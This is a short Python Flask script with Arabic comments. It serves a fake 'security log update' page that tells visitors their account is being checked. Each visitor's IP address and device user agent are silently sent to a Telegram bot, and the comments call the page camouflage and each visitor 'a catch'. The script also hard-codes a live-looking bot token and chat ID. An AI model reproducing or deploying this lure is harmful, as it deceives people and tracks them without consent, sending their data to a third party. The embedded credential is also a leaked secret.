import os
from flask import Flask, request, render_template_string
import telebot

# بياناتك الحقيقية المستخرجة من الصور
TOKEN = "8336936813:AAENAKTwrPn6lCaxlWarBYQwAhCaGZBXwUk"
CHAT_ID = "8351043975"

bot = telebot.TeleBot(TOKEN)
app = Flask(__name__)

# صفحة التمويه الاحترافية
HTML_PAGE = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تحديث سجل الأمان</title>
</head>
<body style="background-color:#0d1117; color:#c9d1d9; font-family:sans-serif; display:flex; justify-content:center; align-items:center; height:100vh; margin:0;">
    <div style="text-align:center; border:1px solid #30363d; padding:40px; border-radius:10px; background:#161b22;">
        <div style="color:#238636; font-size:50px;">✔</div>
        <h2>جاري فحص حالة الحساب...</h2>
        <p>يرجى عدم إغلاق هذه الصفحة لتأمين جلسة العمل الحالية.</p>
        <div style="width:200px; height:4px; background:#30363d; margin:20px auto; position:relative; overflow:hidden;">
            <div style="width:50%; height:100%; background:#238636; position:absolute; animation:load 2s infinite linear;"></div>
        </div>
    </div>
    <style>@keyframes load { from {left:-100%} to {left:100%} }</style>
</body>
</html>
"""

@app.route('/')
def main():
    # جمع بيانات "الصيد"
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    ua = request.user_agent.string
    
    report = f"🎯 **صيد جديد من السيرفر السحابي!**\n\n🌐 **IP:** `{ip}`\n📱 **الجهاز:** `{ua}`\n📍 **المصدر:** `Cloud Host`"
    
    # إرسال التقرير فوراً لبوتك
    try:
        bot.send_message(CHAT_ID, report, parse_mode="Markdown")
    except:
        pass
        
    return render_template_string(HTML_PAGE)

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
